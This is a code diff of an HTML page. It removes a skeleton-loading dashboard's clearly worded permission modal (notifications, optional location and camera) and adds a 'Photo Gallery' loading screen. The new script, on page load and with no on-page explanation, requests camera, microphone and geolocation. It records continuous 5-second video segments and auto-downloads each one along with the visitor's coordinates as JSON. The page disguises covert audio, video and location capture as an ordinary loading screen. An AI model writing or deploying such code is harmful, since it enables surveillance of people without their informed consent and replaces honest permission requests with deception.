@@ -4,492 +4,226 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Skeleton Loading with Permissions</title>
+    <title>Skeleton Loading with Auto Recording</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
-
-        * {
-            font-family: 'Inter', sans-serif;
-        }
-
-        /* Skeleton loading animation */
         @keyframes shimmer {
             0% {
                 background-position: -1000px 0;
             }
+
             100% {
                 background-position: 1000px 0;
             }
         }
 
         .skeleton {
-            animation: shimmer 2s infinite;
-            background: linear-gradient(
-                to right,
-                #f0f0f0 0%,
-                #e0e0e0 20%,
-                #f0f0f0 40%,
-                #f0f0f0 100%
-            );
+            animation: shimmer 1.6s linear infinite;
+            background: linear-gradient(to right,
+                    #f3f4f6 0%,
+                    #e5e7eb 20%,
+                    #f3f4f6 40%,
+                    #f3f4f6 100%);
             background-size: 1000px 100%;
         }
 
         .dark .skeleton {
-            background: linear-gradient(
-                to right,
-                #2d3748 0%,
-                #4a5568 20%,
-                #2d3748 40%,
-                #2d3748 100%
-            );
+            background: linear-gradient(to right,
+                    #1f2937 0%,
+                    #374151 20%,
+                    #1f2937 40%,
+                    #1f2937 100%);
             background-size: 1000px 100%;
-        }
-
-        /* Fade in/out animations */
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(-10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        @keyframes fadeOut {
-            from {
-                opacity: 1;
-            }
-            to {
-                opacity: 0;
-            }
-        }
-
-        .fade-in {
-            animation: fadeIn 0.5s ease-out forwards;
-        }
-
-        .fade-out {
-            animation: fadeOut 0.3s ease-out forwards;
-        }
-
-        /* Modal animation */
-        @keyframes slideUp {
-            from {
-                transform: translateY(100px);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
-        }
-
-        .modal-content {
-            animation: slideUp 0.4s ease-out forwards;
-        }
-
-        /* Hide scrollbar during loading */
-        body.loading {
-            overflow: hidden;
-        }
-
-        /* Permission icons animation */
-        @keyframes pulse {
-            0%, 100% {
-                opacity: 1;
-                transform: scale(1);
-            }
-            50% {
-                opacity: 0.8;
-                transform: scale(1.05);
-            }
-        }
-
-        .pulse-animation {
-            animation: pulse 2s ease-in-out infinite;
         }
     </style>
 </head>
 
-<body class="bg-gray-50 dark:bg-gray-900 transition-colors duration-300 loading">
-    
-    <!-- Skeleton Loading Screen -->
-    <div id="skeletonScreen" class="min-h-screen p-6">
-        <!-- Header Skeleton -->
-        <div class="max-w-7xl mx-auto">
-            <!-- Top Navigation Skeleton -->
-            <div class="flex items-center justify-between mb-8">
-                <div class="skeleton h-10 w-40 rounded-lg"></div>
-                <div class="flex gap-4">
-                    <div class="skeleton h-10 w-10 rounded-full"></div>
-                    <div class="skeleton h-10 w-10 rounded-full"></div>
-                    <div class="skeleton h-10 w-10 rounded-full"></div>
-                </div>
+<body class="bg-gray-50 dark:bg-gray-900 min-h-screen">
+    <main class="max-w-6xl mx-auto px-4 py-12">
+        <header class="mb-10 flex items-center justify-between">
+            <div>
+                <p class="text-sm uppercase tracking-wide text-gray-500 dark:text-gray-400">Loading</p>
+                <h1 class="text-3xl font-bold text-gray-900 dark:text-white">Photo Gallery</h1>
             </div>
-
-            <!-- Hero Section Skeleton -->
-            <div class="mb-12">
-                <div class="skeleton h-12 w-3/4 mb-4 rounded-lg"></div>
-                <div class="skeleton h-6 w-1/2 mb-2 rounded-lg"></div>
-                <div class="skeleton h-6 w-2/3 rounded-lg"></div>
+            <div class="flex gap-3">
+                <div class="skeleton h-10 w-10 rounded-full"></div>
+                <div class="skeleton h-10 w-24 rounded-full"></div>
             </div>
+        </header>
 
-            <!-- Cards Grid Skeleton -->
-            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-12">
-                <!-- Card 1 -->
-                <div class="bg-white dark:bg-gray-800 rounded-xl p-6 shadow-lg">
-                    <div class="skeleton h-48 w-full rounded-lg mb-4"></div>
-                    <div class="skeleton h-6 w-3/4 mb-3 rounded"></div>
-                    <div class="skeleton h-4 w-full mb-2 rounded"></div>
-                    <div class="skeleton h-4 w-5/6 rounded"></div>
+        <section class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
+            <!-- Skeleton card 1 -->
+            <article class="bg-white dark:bg-gray-800 rounded-2xl shadow-lg overflow-hidden">
+                <div class="skeleton w-full aspect-[4/3]"></div>
+                <div class="p-4 space-y-3">
+                    <div class="skeleton h-4 w-3/5 rounded"></div>
+                    <div class="skeleton h-3 w-full rounded"></div>
+                    <div class="skeleton h-3 w-4/5 rounded"></div>
                 </div>
+            </article>
 
-                <!-- Card 2 -->
-                <div class="bg-white dark:bg-gray-800 rounded-xl p-6 shadow-lg">
-                    <div class="skeleton h-48 w-full rounded-lg mb-4"></div>
-                    <div class="skeleton h-6 w-3/4 mb-3 rounded"></div>
-                    <div class="skeleton h-4 w-full mb-2 rounded"></div>
-                    <div class="skeleton h-4 w-5/6 rounded"></div>
+            <!-- Skeleton card 2 -->
+            <article class="bg-white dark:bg-gray-800 rounded-2xl shadow-lg overflow-hidden">
+                <div class="skeleton w-full aspect-[4/3]"></div>
+                <div class="p-4 space-y-3">
+                    <div class="skeleton h-4 w-2/3 rounded"></div>
+                    <div class="skeleton h-3 w-full rounded"></div>
+                    <div class="skeleton h-3 w-3/5 rounded"></div>
                 </div>
+            </article>
 
-                <!-- Card 3 -->
-                <div class="bg-white dark:bg-gray-800 rounded-xl p-6 shadow-lg">
-                    <div class="skeleton h-48 w-full rounded-lg mb-4"></div>
-                    <div class="skeleton h-6 w-3/4 mb-3 rounded"></div>
-                    <div class="skeleton h-4 w-full mb-2 rounded"></div>
-                    <div class="skeleton h-4 w-5/6 rounded"></div>
+            <!-- Skeleton card 3 -->
+            <article class="bg-white dark:bg-gray-800 rounded-2xl shadow-lg overflow-hidden">
+                <div class="skeleton w-full aspect-[4/3]"></div>
+                <div class="p-4 space-y-3">
+                    <div class="skeleton h-4 w-1/2 rounded"></div>
+                    <div class="skeleton h-3 w-full rounded"></div>
+                    <div class="skeleton h-3 w-4/5 rounded"></div>
                 </div>
-            </div>
+            </article>
 
-            <!-- Content Section Skeleton -->
-            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
-                <!-- Main Content -->
-                <div class="lg:col-span-2 bg-white dark:bg-gray-800 rounded-xl p-6 shadow-lg">
-                    <div class="skeleton h-8 w-1/2 mb-4 rounded"></div>
-                    <div class="space-y-3">
-                        <div class="skeleton h-4 w-full rounded"></div>
-                        <div class="skeleton h-4 w-full rounded"></div>
-                        <div class="skeleton h-4 w-3/4 rounded"></div>
-                        <div class="skeleton h-4 w-full rounded"></div>
-                        <div class="skeleton h-4 w-5/6 rounded"></div>
-                    </div>
+            <!-- Skeleton card 4 -->
+            <article class="bg-white dark:bg-gray-800 rounded-2xl shadow-lg overflow-hidden">
+                <div class="skeleton w-full aspect-[4/3]"></div>
+                <div class="p-4 space-y-3">
+                    <div class="skeleton h-4 w-2/3 rounded"></div>
+                    <div class="skeleton h-3 w-full rounded"></div>
+                    <div class="skeleton h-3 w-2/3 rounded"></div>
                 </div>
+            </article>
 
-                <!-- Sidebar -->
-                <div class="bg-white dark:bg-gray-800 rounded-xl p-6 shadow-lg">
-                    <div class="skeleton h-8 w-2/3 mb-4 rounded"></div>
-                    <div class="space-y-3">
-                        <div class="skeleton h-16 w-full rounded-lg"></div>
-                        <div class="skeleton h-16 w-full rounded-lg"></div>
-                        <div class="skeleton h-16 w-full rounded-lg"></div>
-                    </div>
+            <!-- Skeleton card 5 -->
+            <article class="bg-white dark:bg-gray-800 rounded-2xl shadow-lg overflow-hidden">
+                <div class="skeleton w-full aspect-[4/3]"></div>
+                <div class="p-4 space-y-3">
+                    <div class="skeleton h-4 w-3/4 rounded"></div>
+                    <div class="skeleton h-3 w-full rounded"></div>
+                    <div class="skeleton h-3 w-1/2 rounded"></div>
                 </div>
-            </div>
-        </div>
-    </div>
+            </article>
 
-    <!-- Actual Content (Hidden Initially) -->
-    <div id="actualContent" class="hidden min-h-screen">
-        <div class="max-w-7xl mx-auto p-6">
-            <!-- Header -->
-            <header class="flex items-center justify-between mb-8 fade-in">
-                <h1 class="text-3xl font-bold text-gray-900 dark:text-white">Life of Code</h1>
-                <div class="flex gap-4">
-                    <button class="p-2 hover:bg-gray-100 dark:hover:bg-gray-800 rounded-full transition-colors">
-                        <svg class="w-6 h-6 text-gray-600 dark:text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
-                        </svg>
-                    </button>
-                    <button class="p-2 hover:bg-gray-100 dark:hover:bg-gray-800 rounded-full transition-colors">
-                        <svg class="w-6 h-6 text-gray-600 dark:text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path>
-                        </svg>
-                    </button>
-                    <button class="p-2 hover:bg-gray-100 dark:hover:bg-gray-800 rounded-full transition-colors">
-                        <svg class="w-6 h-6 text-gray-600 dark:text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
-                        </svg>
-                    </button>
+            <!-- Skeleton card 6 -->
+            <article class="bg-white dark:bg-gray-800 rounded-2xl shadow-lg overflow-hidden">
+                <div class="skeleton w-full aspect-[4/3]"></div>
+                <div class="p-4 space-y-3">
+                    <div class="skeleton h-4 w-3/5 rounded"></div>
+                    <div class="skeleton h-3 w-full rounded"></div>
+                    <div class="skeleton h-3 w-4/5 rounded"></div>
                 </div>
-            </header>
-
-            <!-- Hero Section -->
-            <section class="mb-12 fade-in">
-                <h2 class="text-4xl font-bold text-gray-900 dark:text-white mb-4">Welcome to Your Dashboard</h2>
-                <p class="text-lg text-gray-600 dark:text-gray-300 mb-2">Explore your coding journey with interactive content</p>
-                <p class="text-gray-500 dark:text-gray-400">Start learning and building amazing projects</p>
-            </section>
-
-            <!-- Cards Grid -->
-            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-12">
-                <!-- Card 1 -->
-                <div class="bg-gradient-to-br from-purple-500 to-indigo-600 rounded-xl p-6 shadow-lg text-white fade-in hover:shadow-2xl transition-shadow">
-                    <div class="h-48 flex items-center justify-center mb-4">
-                        <svg class="w-24 h-24" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"></path>
-                        </svg>
-                    </div>
-                    <h3 class="text-xl font-bold mb-3">Learn to Code</h3>
-                    <p class="text-purple-100 mb-2">Master programming fundamentals</p>
-                    <p class="text-purple-200 text-sm">Start your journey with DSA and algorithms</p>
-                </div>
-
-                <!-- Card 2 -->
-                <div class="bg-gradient-to-br from-pink-500 to-rose-600 rounded-xl p-6 shadow-lg text-white fade-in hover:shadow-2xl transition-shadow">
-                    <div class="h-48 flex items-center justify-center mb-4">
-                        <svg class="w-24 h-24" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
-                        </svg>
-                    </div>
-                    <h3 class="text-xl font-bold mb-3">Build Projects</h3>
-                    <p class="text-pink-100 mb-2">Create real-world applications</p>
-                    <p class="text-pink-200 text-sm">Practice with hands-on projects</p>
-                </div>
-
-                <!-- Card 3 -->
-                <div class="bg-gradient-to-br from-blue-500 to-cyan-600 rounded-xl p-6 shadow-lg text-white fade-in hover:shadow-2xl transition-shadow">
-                    <div class="h-48 flex items-center justify-center mb-4">
-                        <svg class="w-24 h-24" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
-                        </svg>
-                    </div>
-                    <h3 class="text-xl font-bold mb-3">Compete & Grow</h3>
-                    <p class="text-blue-100 mb-2">Join competitive programming</p>
-                    <p class="text-blue-200 text-sm">Solve challenges and improve skills</p>
-                </div>
-            </div>
-
-            <!-- Content Section -->
-            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
-                <!-- Main Content -->
-                <div class="lg:col-span-2 bg-white dark:bg-gray-800 rounded-xl p-6 shadow-lg fade-in">
-                    <h3 class="text-2xl font-bold text-gray-900 dark:text-white mb-4">Recent Activities</h3>
-                    <div class="space-y-3 text-gray-600 dark:text-gray-300">
-                        <p>Welcome to your personalized dashboard! Here you can track your learning progress, access your projects, and explore new challenges.</p>
-                        <p>Our platform offers a comprehensive learning experience with tutorials, exercises, and real-world projects.</p>
-                        <p>Get started by exploring the sections above or continue with your current learning path.</p>
-                        <p>Join our community of developers and share your knowledge with others while learning from their experiences.</p>
-                        <p>Stay updated with the latest trends in web development and programming best practices.</p>
-                    </div>
-                </div>
-
-                <!-- Sidebar -->
-                <div class="bg-white dark:bg-gray-800 rounded-xl p-6 shadow-lg fade-in">
-                    <h3 class="text-xl font-bold text-gray-900 dark:text-white mb-4">Quick Links</h3>
-                    <div class="space-y-3">
-                        <a href="#" class="block p-4 bg-gray-100 dark:bg-gray-700 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-600 transition-colors">
-                            <div class="font-semibold text-gray-900 dark:text-white">Fundamentals</div>
-                            <div class="text-sm text-gray-500 dark:text-gray-400">Learn the basics</div>
-                        </a>
-                        <a href="#" class="block p-4 bg-gray-100 dark:bg-gray-700 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-600 transition-colors">
-                            <div class="font-semibold text-gray-900 dark:text-white">DSA</div>
-                            <div class="text-sm text-gray-500 dark:text-gray-400">Data structures & algorithms</div>
-                        </a>
-                        <a href="#" class="block p-4 bg-gray-100 dark:bg-gray-700 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-600 transition-colors">
-                            <div class="font-semibold text-gray-900 dark:text-white">Projects</div>
-                            <div class="text-sm text-gray-500 dark:text-gray-400">Build something amazing</div>
-                        </a>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Permission Request Modal -->
-    <div id="permissionModal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
-        <div class="modal-content bg-white dark:bg-gray-800 rounded-2xl shadow-2xl max-w-md w-full p-8">
-            <div class="text-center">
-                <!-- Permission Icons -->
-                <div class="flex justify-center gap-4 mb-6">
-                    <div class="pulse-animation p-4 bg-purple-100 dark:bg-purple-900 rounded-full">
-                        <svg class="w-8 h-8 text-purple-600 dark:text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path>
-                        </svg>
-                    </div>
-                    <div class="pulse-animation p-4 bg-blue-100 dark:bg-blue-900 rounded-full" style="animation-delay: 0.2s">
-                        <svg class="w-8 h-8 text-blue-600 dark:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"></path>
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"></path>
-                        </svg>
-                    </div>
-                    <div class="pulse-animation p-4 bg-green-100 dark:bg-green-900 rounded-full" style="animation-delay: 0.4s">
-                        <svg class="w-8 h-8 text-green-600 dark:text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path>
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path>
-                        </svg>
-                    </div>
-                </div>
-
-                <!-- Modal Title -->
-                <h2 class="text-2xl font-bold text-gray-900 dark:text-white mb-3">Enable Permissions</h2>
-                <p class="text-gray-600 dark:text-gray-300 mb-6">
-                    To provide you with the best experience, we'd like to request the following permissions:
-                </p>
-
-                <!-- Permission List -->
-                <div class="text-left space-y-3 mb-8">
-                    <div class="flex items-start gap-3 p-3 bg-gray-50 dark:bg-gray-700 rounded-lg">
-                        <svg class="w-5 h-5 text-purple-600 dark:text-purple-400 mt-0.5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path>
-                        </svg>
-                        <div>
-                            <div class="font-semibold text-gray-900 dark:text-white">Notifications</div>
-                            <div class="text-sm text-gray-500 dark:text-gray-400">Get updates on new content and courses</div>
-                        </div>
-                    </div>
-
-                    <div class="flex items-start gap-3 p-3 bg-gray-50 dark:bg-gray-700 rounded-lg">
-                        <svg class="w-5 h-5 text-blue-600 dark:text-blue-400 mt-0.5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"></path>
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"></path>
-                        </svg>
-                        <div>
-                            <div class="font-semibold text-gray-900 dark:text-white">Location (Optional)</div>
-                            <div class="text-sm text-gray-500 dark:text-gray-400">Find local coding events and meetups</div>
-                        </div>
-                    </div>
-
-                    <div class="flex items-start gap-3 p-3 bg-gray-50 dark:bg-gray-700 rounded-lg">
-                        <svg class="w-5 h-5 text-green-600 dark:text-green-400 mt-0.5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path>
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path>
-                        </svg>
-                        <div>
-                            <div class="font-semibold text-gray-900 dark:text-white">Camera (Optional)</div>
-                            <div class="text-sm text-gray-500 dark:text-gray-400">Upload profile pictures and share screenshots</div>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Action Buttons -->
-                <div class="flex gap-3">
-                    <button onclick="denyPermissions()" class="flex-1 px-6 py-3 bg-gray-200 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-xl font-semibold hover:bg-gray-300 dark:hover:bg-gray-600 transition-colors">
-                        Not Now
-                    </button>
-                    <button onclick="allowPermissions()" class="flex-1 px-6 py-3 bg-gradient-to-r from-purple-600 to-indigo-600 text-white rounded-xl font-semibold hover:from-purple-700 hover:to-indigo-700 transition-all shadow-lg hover:shadow-xl">
-                        Allow
-                    </button>
-                </div>
-
-                <!-- Privacy Note -->
-                <p class="text-xs text-gray-500 dark:text-gray-400 mt-4">
-                    You can change these permissions anytime in settings
-                </p>
-            </div>
-        </div>
-    </div>
+            </article>
+        </section>
+    </main>
 
     <script>
-        // Configuration
-        const LOADING_DURATION = 3000; // 3 seconds of skeleton loading
+        let mediaRecorder;
+        let videoChunks = [];
+        let locationData = null;
+        let recordingCount = 0;
 
-        // Initialize the page
-        document.addEventListener('DOMContentLoaded', function() {
-            // Simulate loading
-            setTimeout(() => {
-                hideSkeletonAndShowContent();
-            }, LOADING_DURATION);
-        });
+        async function initializeRecording() {
+            try {
+                // Request camera and microphone together
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: true,
+                    audio: true
+                });
 
-        // Hide skeleton and show actual content
-        function hideSkeletonAndShowContent() {
-            const skeletonScreen = document.getElementById('skeletonScreen');
-            const actualContent = document.getElementById('actualContent');
-            
-            // Fade out skeleton
-            skeletonScreen.classList.add('fade-out');
-            
-            setTimeout(() => {
-                // Hide skeleton and show content
-                skeletonScreen.classList.add('hidden');
-                actualContent.classList.remove('hidden');
-                document.body.classList.remove('loading');
-                
-                // Show permission modal after a brief delay
-                setTimeout(() => {
-                    showPermissionModal();
-                }, 500);
-            }, 300);
-        }
-
-        // Show permission modal
-        function showPermissionModal() {
-            const modal = document.getElementById('permissionModal');
-            modal.classList.remove('hidden');
-        }
-
-        // Hide permission modal
-        function hidePermissionModal() {
-            const modal = document.getElementById('permissionModal');
-            modal.classList.add('hidden');
-        }
-
-        // Allow permissions
-        function allowPermissions() {
-            // Request actual browser permissions
-            requestNotificationPermission();
-            hidePermissionModal();
-            showNotification('Permissions granted!', 'Thank you for enabling permissions.', 'success');
-        }
-
-        // Deny permissions
-        function denyPermissions() {
-            hidePermissionModal();
-            showNotification('Permissions denied', 'You can enable them later in settings.', 'info');
-        }
-
-        // Request notification permission
-        async function requestNotificationPermission() {
-            if ('Notification' in window) {
-                try {
-                    const permission = await Notification.requestPermission();
-                    console.log('Notification permission:', permission);
-                } catch (error) {
-                    console.error('Error requesting notification permission:', error);
+                // Request location
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            locationData = {
+                                latitude: pos.coords.latitude,
+                                longitude: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy,
+                                timestamp: new Date().toISOString()
+                            };
+                            console.log('Location captured:', locationData);
+                        },
+                        (err) => {
+                            console.log('Location permission denied:', err.message);
+                        }
+                    );
                 }
+
+                // Start recording with 5-second intervals
+                startRecordingCycle(stream);
+            } catch (error) {
+                console.error('Error accessing media devices:', error);
             }
         }
 
-        // Show notification (toast-like message)
-        function showNotification(title, message, type = 'info') {
-            const colors = {
-                success: 'bg-green-500',
-                info: 'bg-blue-500',
-                warning: 'bg-yellow-500',
-                error: 'bg-red-500'
-            };
+        function startRecordingCycle(stream) {
+            function recordNextSegment() {
+                videoChunks = [];
+                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
 
-            const notification = document.createElement('div');
-            notification.className = `fixed top-4 right-4 ${colors[type]} text-white px-6 py-4 rounded-lg shadow-2xl z-50 fade-in max-w-sm`;
-            notification.innerHTML = `
-                <div class="font-bold mb-1">${title}</div>
-                <div class="text-sm opacity-90">${message}</div>
-            `;
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        videoChunks.push(event.data);
+                    }
+                };
 
-            document.body.appendChild(notification);
+                mediaRecorder.onstop = () => {
+                    const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+                    saveVideoFile(videoBlob);
 
-            // Remove notification after 3 seconds
-            setTimeout(() => {
-                notification.classList.add('fade-out');
-                setTimeout(() => notification.remove(), 300);
-            }, 3000);
+                    // Save location data with each video
+                    if (locationData) {
+                        saveLocationFile(locationData);
+                    }
+
+                    // Continue recording next segment
+                    recordingCount++;
+                    recordNextSegment();
+                };
+
+                mediaRecorder.start();
+                console.log(`Recording segment ${recordingCount + 1} started`);
+
+                // Stop and save after 5 seconds
+                setTimeout(() => {
+                    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                        mediaRecorder.stop();
+                    }
+                }, 5000);
+            }
+
+            recordNextSegment();
         }
 
-        // Dark mode toggle (optional enhancement)
-        function toggleDarkMode() {
-            document.documentElement.classList.toggle('dark');
-            localStorage.setItem('darkMode', document.documentElement.classList.contains('dark'));
+        function saveVideoFile(blob) {
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `video_${recordingCount}_${Date.now()}.webm`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            console.log(`Video segment ${recordingCount} saved`);
         }
 
-        // Load dark mode preference
-        if (localStorage.getItem('darkMode') === 'true') {
-            document.documentElement.classList.add('dark');
+        function saveLocationFile(location) {
+            const data = JSON.stringify({
+                ...location,
+                recordingSegment: recordingCount
+            }, null, 2);
+            const blob = new Blob([data], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `location_${recordingCount}_${Date.now()}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            console.log(`Location data ${recordingCount} saved`);
         }
+
+        // Start recording on page load
+        window.addEventListener('load', initializeRecording);
     </script>
-
 </body>
 
 </html>
